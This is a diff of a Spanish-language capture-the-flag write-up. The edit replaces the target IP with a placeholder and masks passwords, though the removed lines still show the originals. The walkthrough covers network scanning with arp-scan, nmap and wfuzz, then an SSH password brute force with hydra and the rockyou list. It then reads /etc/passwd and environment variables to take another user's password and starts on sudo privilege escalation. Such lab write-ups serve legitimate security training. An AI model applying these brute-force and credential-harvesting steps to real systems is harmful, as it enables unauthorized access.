@@ -5,10 +5,10 @@
 ```bash
 # ARP scan
 arp-scan -I eth0 --localnet
-•192.168.200.18  08:00:27:ad:69:c8       PCS Systemtechnik GmbH
+•(IP-victima)  08:00:27:ad:69:c8       PCS Systemtechnik GmbH
 
 # Nmap scan
-nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn 192.168.200.18 -oN nmap
+nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
 •22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
 •80/tcp open  http    Apache httpd 2.4.56 ((Debian))
 ```
@@ -17,7 +17,7 @@ nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn 192.168.200.18 -oN nmap
 
 ```bash
 # WFuzz
-wfuzz --hc=404 -u http://192.168.200.18/FUZZ.php -w /usr/share/dirb/wordlists/big.txt
+wfuzz --hc=404 -u http://(IP-victima)/FUZZ.php -w /usr/share/dirb/wordlists/big.txt
 •/look.php
 •/info.php
 ```
@@ -31,20 +31,20 @@ Dentro de "/look.php" encontramos un texto con un horario "23:15:51 up 32 min,  
 
 ```bash
 # Fuerza bruta al servidor SSH
-hydra -l axel -P /usr/share/wordlists/rockyou.txt -t 5 ssh://192.168.200.18
-•22][ssh] host: 192.168.200.18   login: axel   password: bambam
+hydra -l axel -P /usr/share/wordlists/rockyou.txt -t 5 ssh://(IP-victima)
+•22][ssh] host: (IP-victima)   login: axel   password: b****m
 
 # Acceso al servidor SSH
-ssh axel@192.168.200.18
-pass: bambam
+ssh axel@(IP-victima)
+pass: b****m
 ```
 
 ## Escalada de Privilegios
 
 ```bash
-# Leer /etc/passwd y encontrar usuario "dylan", con el binario "env" encontramos la pass para el usuario "dylan"
+# Leer /etc/passwd y encontrar usuario "dylan", con el binario "env" encontramos la pass para dicho usuario.
 su dylan
-pass: dylanPASS=bl4bl4Dyl4N
+pass: dylanPASS=b*********N
 
 # Verificar privilegios sudo
 sudo -l
